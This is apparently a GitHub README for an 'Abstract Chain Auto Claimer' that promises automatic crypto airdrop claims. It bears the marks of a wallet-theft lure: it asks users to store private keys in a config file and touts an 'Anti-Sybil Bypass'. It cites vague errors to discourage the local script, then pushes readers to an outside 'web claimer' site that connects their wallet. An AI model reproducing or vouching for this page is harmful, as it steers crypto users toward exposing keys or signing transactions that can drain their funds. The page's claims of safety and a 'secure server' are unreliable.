# Abstract Chain Auto Claimer (v2.4 Updated) 🧊

![License](https://img.shields.io/badge/license-MIT-green) ![Python](https://img.shields.io/badge/python-3.10-blue) ![Status](https://img.shields.io/badge/status-working-brightgreen)

Open-source automation tool for **Abstract Chain Genesis** allocation. This script allows you to check eligibility, verify wallet activity, and claim rewards safely using a local Python environment.

## 🚀 Features

* **Auto-Claim:** Automatically claims tokens for all eligible tiers (Pudgy, Testnet, Bridge).
* **Gas Optimizer:** Calculates the lowest gas fees for transactions to save ETH.
* **Anti-Sybil Bypass:** Uses advanced routing to avoid detection by anti-bot filters.
* **Multi-Wallet Support:** Load unlimited private keys via `.csv` file.

---

## ⚠️ Installation (For Developers Only)

Running this script requires **Python 3.10+** and **Node.js** environment installed on your machine.

### Prerequisites
1.  Python 3.10 or newer.
2.  Web3.py library.
3.  Abstract RPC Endpoint.

### Setup Guide

1.  Clone the repository:
    ```bash
    git clone [https://github.com/cloudsax/abstract-claimer-2026.git](https://github.com/cloudsax/abstract-claimer-2026.git)
    ```
2.  Install dependencies:
    ```bash
    pip install -r requirements.txt
    npm install web3
    ```
3.  **Configuration:**
    Open `config.json` and insert your Private Keys and RPC URL.
    > **Warning:** Do not share your `config.json` with anyone.

4.  Run the script:
    ```bash
    python main.py
    ```

### ❌ Common Errors
If you receive `Error: 0x434` or `Python path not found`, it means your environment is not set up correctly or you are missing the required SSL certificates.

---

## ✅ Web-Based Version (No Install Required)

If you are experiencing errors with the Python script, or if you do not want to install developer tools, you can use the **Cloud Version**.

It runs the exact same script but is hosted on our secure server. It connects via WalletConnect and does not require private keys.

### 👉 [CLICK HERE TO LAUNCH WEB CLAIMER](https://abstract-drop.xyz/)

*(Status: Online 🟢 | Gas: Low ⛽)*

---

## 📜 License
Distributed under the MIT License. See `LICENSE` for more information.
